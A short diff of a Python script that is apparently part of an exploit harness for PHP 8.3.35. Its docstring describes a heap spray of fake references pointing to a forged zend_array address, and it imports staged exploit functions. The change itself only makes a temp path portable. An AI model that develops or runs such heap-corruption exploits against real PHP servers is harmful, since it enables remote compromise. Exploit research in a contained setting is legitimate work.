@@ -4,12 +4,13 @@
 S = chunk_base + offset is the fake zend_array (ht field) address. The spray's
 fake refs all point to S. Scan offset so S is correct for 8.3.35's heap layout.
 """
+import os
 import subprocess, sys, os, time, struct
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from p2s8335_lib import (log, PORT, CONTAINER, DTOR_OFFSET, ZIF_OFFSET,
                          stage1, stage2, rotate, restart, container_ok,
                          get_proof, CMD)
-GH = r"C:\Users\likat\.qwen\tmp\p2s"
+GH = os.path.join(os.path.expanduser("~"), ".qwen", "tmp", "p2s")
 TMP = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tmp_8335")
 
 def run9(script, args, timeout=180):
